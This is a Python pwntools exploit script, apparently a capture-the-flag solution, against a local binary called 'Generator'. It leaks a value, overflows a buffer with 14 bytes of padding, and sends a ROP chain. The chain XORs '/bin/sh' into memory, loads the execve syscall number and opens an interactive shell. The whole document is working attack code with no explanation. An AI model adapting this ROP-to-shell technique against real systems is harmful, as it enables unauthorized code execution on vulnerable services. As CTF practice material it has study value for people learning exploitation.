#!/usr/bin/python3
from pwn import process, p64, u64

shell = process("./Generator")

shell.recvuntil(b": ")
xor_str = u64(shell.recvline().strip().ljust(8, b"\x00")) ^ u64(b"/bin/sh\x00")

offset = 14
junk  = b"A" * offset

payload  = b""
payload += b"yes"
payload += junk
payload += p64(0x401222) # pop rdi; pop rsi; pop rdx; ret;
payload += p64(0x404090) # random_str
payload += p64(xor_str)  # xor value
payload += p64(0x3b)     # execve()
payload += p64(0x40121e) # xor qword ptr [rdi], rsi; ret;
payload += p64(0x401226) # xchg rdx, rax; ret;
payload += p64(0x401223) # pop rsi; pop rdx; ret;
payload += p64(0x0) * 2  # NULL
payload += p64(0x401229) # syscall;

shell.sendlineafter(b") ", payload)
shell.recvline()
shell.interactive()
